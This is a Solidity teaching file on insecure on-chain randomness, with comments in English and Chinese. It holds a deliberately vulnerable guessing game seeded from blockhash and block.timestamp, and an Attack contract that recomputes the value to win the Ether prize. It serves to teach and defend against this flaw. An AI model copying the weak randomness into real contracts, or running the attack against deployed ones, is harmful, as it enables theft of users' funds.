// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

/*
NOTE: cannot use blockhash in Remix so use ganache-cli

npm i -g ganache-cli
ganache-cli
In remix switch environment to Web3 provider
*/

/*
GuessTheRandomNumber is a game where you win 1 Ether if you can guess the
pseudo random number generated from block hash and timestamp.

At first glance, it seems impossible to guess the correct number.
But let's see how easy it is win.

1. Alice deploys GuessTheRandomNumber with 1 Ether
2. Eve deploys Attack
3. Eve calls Attack.attack() and wins 1 Ether

What happened?
Attack computed the correct answer by simply copying the code that computes the random number.
*/
/*
Insecure source of randomness
-vulerability (source randomness)
  - block.timestamp
  -blockhash
-contract using insecure randomness
-how to exploit the contract
-code and demo
漏洞预防
在合约中使用block.timestamp时，需要充分考虑该变量可以被矿工操纵，评估矿工的操作是否对合约的安全性产生影响
block.timestamp不仅可以被操纵，还可以被同一区块中的其他合约读取，因此不能用于产生随机数或用于改变合约中的重要状态、判断游戏胜负等
需要进行资金锁定等操作时，如果对于时间操纵比较敏感，建议使用区块高度、近期区块平均时间等数据来进行资金锁定，这些数据不能被矿工操纵
*/
contract GuessTheRandomNumber {
    constructor() payable {}

    function guess(uint _guess) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        if (_guess == answer) {
            (bool sent, ) = msg.sender.call{value: 1 ether}("");
            require(sent, "Failed to send Ether");
        }
    }
}

contract Attack {
    receive() external payable {}

    function attack(GuessTheRandomNumber guessTheRandomNumber) public {
        uint answer = uint(
            keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp))
        );

        guessTheRandomNumber.guess(answer);
    }

    // Helper function to check balance
    function getBalance() public view returns (uint) {
        return address(this).balance;
    }
}
